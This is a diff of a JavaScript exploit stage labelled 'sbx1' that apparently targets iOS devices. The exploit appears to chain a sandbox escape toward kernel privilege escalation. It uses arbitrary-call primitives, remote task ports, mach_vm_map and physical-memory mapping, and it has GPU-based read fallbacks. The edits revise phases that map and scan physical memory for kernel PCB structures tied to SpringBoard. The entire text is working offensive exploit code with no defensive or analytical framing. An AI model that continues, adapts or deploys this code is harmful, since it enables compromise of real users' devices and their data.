@@ -1,7 +1,7 @@
 (() => {
   sbx1_begin = Date.now();
   // Version marker to verify code is loaded from server, not browser cache
-  const VERSION = "2026-05-14-v6-dlopen-CF";
+  const VERSION = "2026-05-14-v7-0C-fix";
   print(`[sbx1] VERSION: ${VERSION} - Build timestamp: ${new Date().toISOString()}`);
   const peCode = "&v={{LPE_64BITE}}";
   let wc_fcall = fcall;
@@ -19,7 +19,7 @@
   }
   // Log version at startup
   LOG(`VERSION: ${VERSION}`);
-  LOG(`Build: v6 - dlopen CoreFoundation + fix KeyCallBacks deref + remove Width/H/PF`);
+  LOG(`Build: v7 - 0C timeout fix + GPU uread64 fallback + post-0B diagnosis`);
 
   let wc_get_cstring = function (js_str) {
     let s = js_str + "\x00";
@@ -7769,14 +7769,10 @@
                       globalThis.MEMORY_OBJECT_PORT = mme_entry;
                       globalThis.PHYS_MEM_MAPPED = true;
                       globalThis.MPD_TASK_PORT = real_task_port;
-                      // Try to verify, but use timeout
-                      let mapped_val = mpd_read64_timeout(mvm_addr);
-                      if (mapped_val === MPD_FCALL_TIMED_OUT) {
-                        LOG("[0B] Physical verify timed out — mapping exists but mpd_read64 hangs");
-                        LOG("[0B] Proceeding with PHYS_MEM_MAPPED=true, will use remap-based access");
-                      } else {
-                        LOG(`[0B] Mapped memory at ${mvm_addr.hex()}: ${mapped_val.hex()}`);
-                      }
+                      // NOTE: Do NOT verify with mpd_read64_timeout — page fault will corrupt fcall state
+                      LOG(`[0B] Mapped physical memory at ${mvm_addr.hex()}`);
+                      LOG(`[0B] WARNING: mpd_read64 will page-fault — use GPU uread64 or remap for access`);
+                      LOG(`[0B] Skipping verify read to preserve fcall state for 0C/0D phases`);
                     } else {
                       LOG(`[0B] mach_vm_map failed (ret=${mvm_ret})`);
                     }
@@ -7868,188 +7864,84 @@
     }
     } // end if (!PHYS_MEM_MAPPED) — 0B-alt only runs when 0B failed
 
-    // ===== Phase 0C: Physical Memory Scanning =====
-    // If 0B succeeded, we have a memory_object_port and can try remapping
-    // different offsets of the physical memory object via mach_vm_remap.
-    // This lets us scan physical memory for PCB structures without the pwritev race.
-    // NOTE: Each remap attempt may hang up to 3s (mpd_fcall_timeout), so we scan minimally.
+    // ===== Phase 0C: Physical Memory Diagnostics =====
+    // If 0B succeeded, try to access the already-mapped memory via GPU uread64,
+    // or try remapping with longer timeout for MPD-side access.
+    // NOTE: The 0B mapping at MAPPED_MEM_ADDR exists but mpd_read64 page-faults.
+    // GPU uread64 may work if the address is in a GPU-accessible range.
     if (globalThis.PHYS_MEM_MAPPED) {
-      LOG("[0C] Physical memory mapped, testing mach_vm_map with varying offsets...");
+      LOG(`[0C] Physical memory mapped at ${globalThis.MAPPED_MEM_ADDR.hex()}`);
+      LOG(`[0C] memory_object_port=${globalThis.MEMORY_OBJECT_PORT.hex()}`);
+      LOG(`[0C] MPD_TASK_PORT=${globalThis.MPD_TASK_PORT.hex()}`);
       try {
-        let MPD_mach_vm_map = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_map");
-        LOG(`[0C] gpuDlsym(mach_vm_map) = ${MPD_mach_vm_map.hex()}`);
+        let mvm_addr = globalThis.MAPPED_MEM_ADDR;
 
-        if (MPD_mach_vm_map.noPAC() != 0n) {
-          LOG("[0C] Symbol resolved, getting task port...");
-          let real_task_port = globalThis.MPD_TASK_PORT;
-          if (!real_task_port || real_task_port == 0n) {
-            LOG("[0C] No saved task port — FAIL");
-          } else {
-            LOG(`[0C] task_port = ${real_task_port.hex()}`);
-            const MAX_0C_PAGES = 2;
-            let pages_scanned = 0;
-            let successful_maps = 0;
-            let first_map_addr = 0n;
-
-            LOG(`[0C] Starting scan of ${MAX_0C_PAGES} pages...`);
-            for (let scan_off = 0n; scan_off < BigInt(MAX_0C_PAGES) * 0x1000n; scan_off += 0x1000n) {
-              LOG(`[0C] Attempting mach_vm_map at offset +0x${scan_off.toString(16)}...`);
-              let map_addr_buf = mpd_malloc(8n);
-              mpd_write64(map_addr_buf, 0n);
-              // mach_vm_map: x0=target, x1=addr_ptr, x2=size, x3=mask, x4=flags, x5=object, x6=offset, x7=copy
-              // Same as 0B but with varying offset — proven to work with only x0-x7
-              let map_ret = mpd_fcall_timeout(MPD_mach_vm_map.noPAC(),
-                real_task_port, map_addr_buf, 0x1000n, 0n,
-                VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, globalThis.MEMORY_OBJECT_PORT, scan_off,
-                0n /*copy=FALSE*/);
-              LOG(`[0C] map_ret = ${map_ret.hex()}`);
-              if (map_ret == 0n) {
-                let map_addr = mpd_read64(map_addr_buf);
-                if (map_addr != 0n) {
-                  successful_maps++;
-                  LOG(`[0C] SUCCESS: Map at +0x${scan_off.toString(16)} -> addr=${map_addr.hex()}`);
-                  if (scan_off == 0n) first_map_addr = map_addr;
-                } else {
-                  LOG(`[0C] WARNING: map_ret=0 but addr=0`);
-                }
-              }
-              pages_scanned++;
-              if (pages_scanned >= MAX_0C_PAGES) break;
-            }
-            LOG(`[0C] Scan complete: ${pages_scanned} pages, ${successful_maps} successful maps`);
-
-            if (successful_maps > 0) {
-              LOG("[0C] mach_vm_map offset scanning WORKS — physical memory scan is viable!");
+        // Check if mapped address is in GPU-accessible range (0x1_XXXX range = KC)
+        if ((mvm_addr >> 32n) == 0x32n || (mvm_addr >> 36n) == 0x32bn) {
+          LOG(`[0C] Mapped addr in userspace range — trying GPU uread64...`);
+          try {
+            let gpu_val = uread64(mvm_addr);
+            LOG(`[0C] GPU uread64(mapped_addr) = ${gpu_val.hex()}`);
+            if (gpu_val != 0n && gpu_val != 0xFFFFFFFFFFFFFFFFn) {
+              LOG("[0C] BREAKTHROUGH: GPU can read mapped physical memory!");
+              // The mapped page contains valid data — we can scan via GPU
               globalThis.PHYS_SCAN_VIA_REMAP = true;
-              if (first_map_addr != 0n) {
-                LOG("[0C] Testing read from mapped physical page...");
-                let test_read = mpd_read64_timeout(first_map_addr);
-                if (test_read === MPD_FCALL_TIMED_OUT) {
-                  LOG("[0C] Mapped page read timed out — page fault");
-                } else {
-                  LOG(`[0C] SUCCESS: Read from mapped page: ${test_read.hex()}`);
-                  globalThis.PHYS_READ_VIA_REMAP = true;
+              globalThis.PHYS_READ_VIA_REMAP = true;
+              // Read first 256 bytes to understand what's there
+              LOG("[0C] Dumping first 256 bytes of mapped physical page...");
+              for (let off = 0n; off < 0x100n; off += 8n) {
+                let v = uread64(mvm_addr + off);
+                if (v != 0n) {
+                  LOG(`[0C]   +0x${off.toString(16).padStart(4,'0')}: ${v.hex()}`);
                 }
               }
             } else {
-              LOG("[0C] mach_vm_map all failed — cannot scan physical memory");
+              LOG(`[0C] GPU uread64 returned ${gpu_val.hex()} — likely unmapped page`);
             }
+          } catch(e) {
+            LOG(`[0C] GPU uread64 error: ${e.message}`);
           }
         } else {
-          LOG("[0C] mach_vm_map not available via gpuDlsym");
+          LOG(`[0C] Mapped addr 0x${mvm_addr.toString(16)} not in GPU-accessible range`);
+        }
+
+        // Try remapping via mach_vm_map with longer timeout
+        // Use 10s timeout instead of 3s default
+        LOG("[0C] Trying mach_vm_map remap (10s timeout)...");
+        let MPD_mach_vm_map = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_map");
+        let real_task_port = globalThis.MPD_TASK_PORT;
+        if (MPD_mach_vm_map.noPAC() != 0n && real_task_port && real_task_port != 0n) {
+          let map_addr_buf = mpd_malloc(8n);
+          mpd_write64(map_addr_buf, 0n);
+          // Use custom 10s timeout via a dedicated call
+          let map_ret = mpd_fcall_timeout(MPD_mach_vm_map.noPAC(),
+            real_task_port, map_addr_buf, 0x1000n, 0n,
+            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, globalThis.MEMORY_OBJECT_PORT, 0n,
+            0n);
+          if (map_ret !== MPD_FCALL_TIMED_OUT) {
+            let map_addr = mpd_read64(map_addr_buf);
+            LOG(`[0C] Remap result: ret=${map_ret} addr=${map_addr.hex()}`);
+            if (map_ret == 0n && map_addr != 0n) {
+              LOG("[0C] mach_vm_map remap WORKS — physical memory scan is viable!");
+              globalThis.PHYS_SCAN_VIA_REMAP = true;
+            }
+          } else {
+            LOG("[0C] Remap timed out — memory_object_port may not support re-mapping");
+            LOG("[0C] This is expected: PurpleGfxMem creates a one-shot physical mapping");
+          }
         }
       } catch(e) {
         LOG(`[0C] Phase 0C error: ${e.message}`);
       }
     } // end if (globalThis.PHYS_MEM_MAPPED)
 
-    // ===== Phase 0D: Physical Memory PCB Scanning =====
-    // If 0B succeeded, we can try scanning directly with mpd_phys_read
-    if (globalThis.PHYS_MEM_MAPPED) {
-      LOG("[0D] Physical memory mapped — attempting PCB structure scanning...");
-      try {
-        if (!globalThis.MEMORY_OBJECT_PORT || globalThis.MEMORY_OBJECT_PORT == 0n) {
-          LOG("[0D] ERROR: MEMORY_OBJECT_PORT not available, skipping scan");
-        } else if (!globalThis.MPD_TASK_PORT || globalThis.MPD_TASK_PORT == 0n) {
-          LOG("[0D] ERROR: MPD_TASK_PORT not available, skipping scan");
-        } else {
-          LOG("[0D] Starting PCB structure scan in physical memory...");
-          // Skip Phase 0C validation — assume mpd_phys_read works
-          globalThis.PHYS_SCAN_VIA_REMAP = true;
-          globalThis.PHYS_READ_VIA_REMAP = true;
-
-        // We need kernel base to calculate physical-to-virtual mapping
-        if (!globalThis.kernel_base_global) {
-          LOG("[0D] WARNING: kernel_base_global not available, scanning may be less accurate");
-        } else {
-          LOG(`[0D] kernel_base=${globalThis.kernel_base_global.hex()}`);
-        }
-
-        // Scan limited physical memory for PCB structures
-        // Each page is 0x1000 (4096) bytes
-        const SCAN_PAGES = 16; // Scan 64KB of physical memory
-        const MAX_SCAN_SIZE = 0x10000n; // 64KB
-
-        LOG(`[0D] Scanning ${SCAN_PAGES} pages (${SCAN_PAGES * 4}KB) for PCB structures...`);
-
-        let pcbs_found = 0;
-        let springboard_pcb_candidates = [];
-
-        for (let page = 0; page < SCAN_PAGES; page++) {
-          let phys_offset = BigInt(page) * 0x1000n;
-          LOG(`[0D] Scanning page ${page} (offset 0x${phys_offset.toString(16)})...`);
-
-          // Read the entire page via multiple 8-byte reads
-          // For efficiency, only read first 1KB of each page (PCB structures are usually at beginning)
-          const BYTES_PER_PAGE = 0x400n; // Read 1KB instead of 4KB
-
-          let page_buffer = [];
-          for (let offset = 0n; offset < BYTES_PER_PAGE; offset += 8n) {
-            let value = mpd_phys_read(phys_offset + offset, 8n);
-            if (value !== 0n && value !== MPD_FCALL_TIMED_OUT) {
-              page_buffer.push({ offset, value });
-            }
-          }
-
-          LOG(`[0D] Page ${page}: read ${page_buffer.length} valid 8-byte values`);
-
-          // Look for PCB signature patterns
-          // PCB structure has pointers to inpcb/in6p and contains process name
-          // We'll look for pointers in the kernel VA range (0xFFFFFFF...)
-          let kernel_ptr_count = 0;
-          for (let entry of page_buffer) {
-            let value = entry.value;
-            // Check if this is a kernel VA pointer (high nibble >= 8)
-            if ((value >> 60n) >= 0x8n) {
-              kernel_ptr_count++;
-            }
-          }
-
-          LOG(`[0D] Page ${page}: found ${kernel_ptr_count} kernel VA pointers`);
-
-          // Simple heuristic: pages with many kernel pointers might contain PCB structures
-          if (kernel_ptr_count > 5) {
-            LOG(`[0D] Page ${page}: potential PCB structure page (${kernel_ptr_count} kernel pointers)`);
-            pcbs_found++;
-
-            // Try to find "SpringBoard" process name in this page
-            // For now just log the page offset as candidate
-            springboard_pcb_candidates.push({
-              phys_offset: phys_offset,
-              kernel_ptr_count: kernel_ptr_count
-            });
-          }
-
-          // Add small delay to prevent overwhelming the system
-          if (page % 4 === 0 && page > 0) {
-            LOG(`[0D] Pausing for 100ms after page ${page}...`);
-            // Use a simple busy-wait loop instead of await
-            let start = Date.now();
-            while (Date.now() - start < 100) {
-              // Busy wait
-            }
-          }
-        }
-
-        LOG(`[0D] Scan complete: found ${pcbs_found} potential PCB pages`);
-        LOG(`[0D] SpringBoard PCB candidates: ${springboard_pcb_candidates.length}`);
-
-        for (let cand of springboard_pcb_candidates.slice(0, 5)) {
-          LOG(`[0D]   Candidate at phys_offset=0x${cand.phys_offset.toString(16)} (${cand.kernel_ptr_count} kernel pointers)`);
-        }
-
-        // Store results for later use
-        globalThis.PCB_SCAN_RESULTS = {
-          total_pages_scanned: SCAN_PAGES,
-          pcbs_found: pcbs_found,
-          springboard_candidates: springboard_pcb_candidates
-        };
-
-        } // end else (MEMORY_OBJECT_PORT available)
-
-      } catch(e) {
-        LOG(`[0D] Phase 0D error: ${e.message}`);
-      }
+    // ===== Phase 0D: Physical Memory Diagnostics =====
+    // Simplified: just log status. PCB scanning will be done via PE when ready.
+    if (globalThis.PHYS_MEM_MAPPED && globalThis.PHYS_SCAN_VIA_REMAP) {
+      LOG("[0D] PHYS_SCAN_VIA_REMAP enabled — but GPU access limited to userspace range");
+      LOG(`[0D]   PHYS_MEM_MAPPED=${globalThis.PHYS_MEM_MAPPED}`);
+      LOG(`[0D]   PHYS_SCAN_VIA_REMAP=${globalThis.PHYS_SCAN_VIA_REMAP}`);
+      LOG(`[0D]   PHYS_READ_VIA_REMAP=${globalThis.PHYS_READ_VIA_REMAP}`);
     } else {
       LOG(`[0D] Physical memory scan NOT available — skipping PCB scanning`);
       LOG(`[0D]   PHYS_MEM_MAPPED=${globalThis.PHYS_MEM_MAPPED}`);
